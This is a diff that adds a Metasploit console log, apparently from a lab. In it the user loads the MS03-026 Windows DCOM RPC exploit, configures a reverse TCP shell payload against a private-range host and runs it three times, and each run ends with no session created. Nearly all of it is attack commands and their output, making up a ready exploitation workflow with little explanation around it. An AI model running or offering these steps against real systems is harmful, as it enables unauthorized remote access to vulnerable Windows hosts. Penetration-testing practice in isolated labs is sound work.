@@ -1,0 +1,63 @@
+msf6 > exploit(windows/dcerpc/ms03_026_dcom) 
+[-] Unknown command: exploit(windows/dcerpc/ms03_026_dcom)
+msf6 > use exploit(windows/dcerpc/ms03_026_dcom)
+[-] No results from search
+[-] Failed to load module: exploit(windows/dcerpc/ms03_026_dcom)
+msf6 > use exploit/windows/dcerpc/ms03_026_dcom
+[*] Using configured payload windows/shell/reverse_tcp
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > show options
+
+Module options (exploit/windows/dcerpc/ms03_026_dcom):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   135              yes       The target port (TCP)
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows NT SP3-6a/2000/XP/2003 Universal
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > set RHOSTS 10.0.2.4
+RHOSTS => 10.0.2.4
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > set LHOST 10.0.2.15
+LHOST => 10.0.2.15
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > run
+
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] 10.0.2.4:135 - Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
+[*] 10.0.2.4:135 - Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:10.0.2.4[135] ...
+[*] 10.0.2.4:135 - Calling DCOM RPC with payload (1648 bytes) ...
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > run -v
+
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] 10.0.2.4:135 - Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
+[*] 10.0.2.4:135 - Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:10.0.2.4[135] ...
+[*] 10.0.2.4:135 - Calling DCOM RPC with payload (1648 bytes) ...
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > setg SessionTlvLogging true
+SessionTlvLogging => true
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > run
+
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] 10.0.2.4:135 - Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
+[*] 10.0.2.4:135 - Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:10.0.2.4[135] ...
+[*] 10.0.2.4:135 - Calling DCOM RPC with payload (1648 bytes) ...
+[*] Exploit completed, but no session was created.
